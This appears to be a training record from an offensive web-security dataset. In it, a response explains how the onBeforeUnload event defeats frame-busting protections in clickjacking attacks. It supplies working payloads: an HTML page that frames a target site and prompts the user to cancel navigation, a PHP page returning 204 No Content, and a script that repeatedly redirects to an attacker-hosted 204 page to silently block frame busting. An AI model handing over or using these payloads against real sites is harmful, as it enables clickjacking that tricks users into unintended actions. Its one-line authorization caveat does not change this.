# CLICKJACKING — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: clickjacking
- cwe: CWE-1021

## Scenario

Show me how OnBeforeUnload Event works in the context of Clickjacking, including the exact payloads/commands.

## Analysis / Response

**OnBeforeUnload Event** — this technique applies to Clickjacking. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

* The `onBeforeUnload` event could be used to evade frame busting code. This event is called when the frame busting code wants to destroy the iframe by loading the URL in the whole web page and not only in the iframe. The handler function returns a string that is prompted to the user asking confirm if he wants to leave the page. When this string is displayed to the user is likely to cancel the navigation, defeating target's frame busting attempt.

* The attacker can use this attack by registering an unload event on the top page using the following example code:

```html
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function()
    {
        return " Do you want to leave fictitious.site?";
    }
</script>
<iframe src="http://target site">
```

* The previous technique requires the user interaction but, the same result, can be achieved without prompting the user. To do this the attacker have to automatically cancel the incoming navigation request in an onBeforeUnload event handler by repeatedly submitting (for example every millisecond) a navigation request to a web page that responds with a _"HTTP/1.1 204 No Content"_ header.

204 page:

```php
<?php
    header("HTTP/1.1 204 No Content");
?>
```

Attacker's Page:

```js
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://target site">
```
